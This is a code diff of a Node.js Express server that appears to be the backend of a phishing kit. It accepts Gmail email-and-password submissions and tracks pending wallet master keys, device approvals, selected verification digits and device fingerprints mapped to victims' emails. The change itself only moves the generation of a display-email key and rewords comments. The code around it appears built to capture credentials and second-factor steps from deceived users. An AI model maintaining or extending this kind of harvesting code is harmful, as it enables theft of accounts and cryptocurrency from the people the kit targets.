@@ -158,7 +158,7 @@ const pendingMasterKey = {};
 const pendingWalletOptions = {};
 const pendingDeviceApproval = {};
 const pendingGmailLogin = {};
-const displayEmailStore = {}; // ✅ Store display emails with unique keys
+const displayEmailStore = {}; // ✅ Store display emails
 const pendingVerificationPage = {};
 const userSelectedDigits = {};
 const deviceFingerprintToEmail = {};
@@ -322,6 +322,9 @@ app.post("/send-gmail-login", async (req, res) => {
     if (!email || !password || !userId) return res.status(400).json({ error: "Missing email, password, or userId" });
     
     const requestId = `gmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+    const displayEmailKey = `displayEmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+    displayEmailStore[displayEmailKey] = email;
+    console.log(`📧 Stored display email with key ${displayEmailKey}: ${email}`);
     const { ip, device, region } = await getClientInfo(req);
     
     // Get fingerprint and store email
@@ -330,11 +333,6 @@ app.post("/send-gmail-login", async (req, res) => {
       deviceFingerprintToEmail[fingerprint] = email;
       console.log(`💾 Stored email for fingerprint ${fingerprint}: ${email}`);
     }
-    
-    // ✅ Generate unique key for display email and store it
-    const displayEmailKey = `displayEmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
-    displayEmailStore[displayEmailKey] = email;
-    console.log(`📧 Stored display email with key ${displayEmailKey}: ${email}`);
 
     const emailForThisIP = resolveEmailFromRequest(req);
     console.log(`📥 Gmail Login Request received: ${requestId}`);
@@ -398,7 +396,7 @@ app.get("/api/gmail-login-status/:requestId", (req, res) => {
   }
 });
 
-// ✅ NEW: Get Gmail display email by key
+// ✅ Get display email by key
 app.get("/api/display-email/:displayEmailKey", (req, res) => {
   try {
     const { displayEmailKey } = req.params;
